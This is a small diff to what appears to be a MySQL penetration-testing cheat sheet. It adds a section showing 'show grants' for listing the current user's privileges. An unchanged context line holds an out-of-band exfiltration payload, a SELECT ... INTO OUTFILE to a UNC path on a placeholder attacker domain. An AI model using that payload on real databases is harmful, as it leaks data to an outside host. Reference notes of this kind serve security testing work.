@@ -138,6 +138,14 @@ SELECT $COLUMNS_TO_EXFIL INTO OUTFILE '\\\\$YOUR_SUBDOMAIN.$YOUR_DOMAIN\\a'
 
 ---
 
+## Show Current User's MySQL Privileges
+
+```sql
+show grants
+```
+
+---
+
 ## Interact with test database
 
 [Reference](https://hub.docker.com/r/genschsa/mysql-employees)
